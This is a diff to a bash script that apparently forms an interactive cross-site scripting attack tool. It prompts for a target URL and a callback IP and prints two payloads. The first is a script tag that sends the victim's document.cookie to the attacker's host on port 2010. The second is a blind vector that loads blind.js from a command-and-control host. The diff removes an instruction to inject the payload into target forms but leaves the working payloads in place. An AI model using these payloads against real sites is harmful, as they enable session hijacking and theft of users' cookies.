@@ -22,17 +22,15 @@ while true; do
         1)
             echo -ne "${Y}Enter Target URL > ${N}"
             read -r target
-            echo -ne "${Y}Enter Callback IP/URL > ${N}"
+            echo -ne "${Y}Enter Callback IP > ${N}"
             read -r callback_url
             
             echo -e "${G}[+] Initializing Session Hook...${N}"
             sleep 1
             
-            # Payload pake Port 2010
             RAW_PAYLOAD="<script>new Image().src='http://${callback_url}:2010/?c='+document.cookie;</script>"
             
             echo -e "${W}Raw Vector:${N} $RAW_PAYLOAD"
-            echo -e "${Y}[*] Inject this into target's input forms.${N}"
             echo ""
             read -p "Press Enter to continue..."
             ;;
@@ -42,7 +40,6 @@ while true; do
             echo -e "${G}[+] Deploying Blind Vector...${N}"
             sleep 1
             
-            # Payload pake Port 2010
             PAYLOAD="<script src=\"http://${c2_url}:2010/blind.js\"></script>"
             echo -e "${W}Vector:${N} $PAYLOAD"
             echo ""
